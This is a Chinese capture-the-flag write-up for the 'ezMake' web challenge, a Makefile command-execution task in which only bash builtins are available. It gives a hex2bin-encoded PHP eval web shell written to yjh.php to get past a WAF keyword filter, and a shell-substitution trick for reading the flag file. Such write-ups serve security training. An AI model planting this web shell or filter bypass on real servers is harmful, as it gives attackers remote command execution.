# ezMake

> 分类：Web

## 题目描述
一道基于 Makefile 的命令执行题。PATH 环境变量被显式清空，shell 无法定位外部命令，只能使用 bash 内建命令。需要通过内建命令写马或读 flag。

## 考察知识点
- Makefile 语法与环境变量
- Bash 内建命令利用
- 关键字过滤绕过（hex2bin 写马）

## 解法
PATH 被清空，只能用 bash 内建命令（echo、cd、pwd、export 等）。`echo` 可用。

直接 `echo` 写马会被 waf 拦截，base64 也会被拦截，但 `hex2bin` 可以绕过：
```
echo '<?=eval(hex2bin("6576616c28245f504f53545b22636d64225d293b"))?>' > yjh.php
```
`6576616c28245f504f53545b22636d64225d293b` 为 `eval($_POST["cmd"])` 的 hex，写入 yjh.php 后命令执行拿 flag。

另解（利用 shell 变量替换符读文件，注意 makefile 中 `$$` 才代表一个 `$`）：
```
echo $$(<flag)
```
或直接访问 `url/flag`（题目提示 flag 在当前目录，非预期直接下载）。

## 参考答案
（未给出，见截图）

## 来源
- 作者：Z3r4y（uuzeray） | https://blog.csdn.net/uuzeray/article/details/138274291
- 作者：HvAng | https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html
- 作者：J1rrY | https://j1rry-learn.github.io/posts/2024-xyctf-webmisc-wp/
